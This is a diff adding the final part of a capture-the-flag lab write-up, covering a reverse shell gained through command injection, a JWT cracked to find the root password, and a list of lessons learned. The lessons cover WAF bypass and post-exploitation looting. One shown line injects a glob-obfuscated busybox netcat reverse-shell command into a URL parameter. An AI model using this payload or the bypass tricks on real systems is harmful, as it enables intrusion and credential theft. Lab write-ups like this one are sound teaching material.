@@ -121,3 +121,50 @@ http://192.168.100.14/test.php?file=shell;busybox /b?n/nc 192.168.100.5 4433  -e
 and got the reverse shell
 
 ![reverse shell](./screenshots/rev_shell.png)
+
+As I got the reverse shell, after little bit enumeration I got a text file in path
+`/home/bob` 
+
+Its contents is:
+
+```jwt
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg
+```
+
+It is JWT token, so to crack this I used [JWT cracker](https://github.com/brendan-rius/c-jwt-cracker) and the secret is `mlnV1`
+
+Let's use this as root user password 
+![flag](./screenshots/flag.png)
+
+## Got the FLAG 🚩🚩
+
+## Key Learnings
+.
+
+🌐 Web fuzzing & file inclusion:
+
+- Hidden endpoints (test.php) can reveal vulnerabilities.
+
+- Local File Inclusion (LFI) can sometimes be combined with command injection (e.g., payloads like |id).
+
+🛡️ Bypassing WAF:
+
+- Try variations of payloads and fuzzers (wfuzz) to identify allowed characters/commands.
+
+- Use known exploits from resources like GTFOBins for binaries available on the host (busybox here).
+
+🖥️ Privilege escalation / gaining shell:
+
+- Reverse shells via netcat or busybox can provide access when direct execution is blocked.
+
+🔑 Post-exploitation:
+
+- Enumerate user directories to find sensitive data (e.g., JWT tokens).
+
+- Decode/crack JWT secrets; they might act as credentials for privilege escalation.
+
+🚩 General tips:
+
+- Systematic enumeration → exploit → shell → escalate → loot is a solid workflow.
+
+- Document every step and payload for future reference
